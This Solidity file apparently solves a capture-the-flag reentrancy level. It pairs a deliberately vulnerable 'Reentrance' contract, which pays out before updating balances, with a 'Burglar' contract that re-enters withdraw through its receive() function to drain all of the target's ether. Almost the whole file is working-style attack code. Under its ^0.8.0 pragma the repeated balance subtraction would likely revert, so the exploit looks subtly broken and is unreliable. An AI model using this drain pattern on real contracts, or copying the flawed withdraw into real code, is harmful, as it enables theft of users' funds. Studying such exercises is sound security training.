// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw(uint256 _amount) external;

    receive() external payable;
}

contract Burglar {
    //
    IReentrance exploited;
    uint256 public stealAmount;

    event Withdraw(uint256 amount);

    constructor(address payable addr) {
        exploited = IReentrance(addr);
    }

    function donateAndSteal() public payable {
        stealAmount = msg.value;
        exploited.donate{value: stealAmount}(address(this));
        steal();
    }

    receive() external payable {
        steal();
    }

    function steal() public {
        uint256 balance = address(exploited).balance;

        if (balance > 0) {
            if (balance > stealAmount) {
                exploited.withdraw(stealAmount);
                emit Withdraw(stealAmount);
            } else {
                exploited.withdraw(balance);
                emit Withdraw(balance);
            }
        }
    }
}
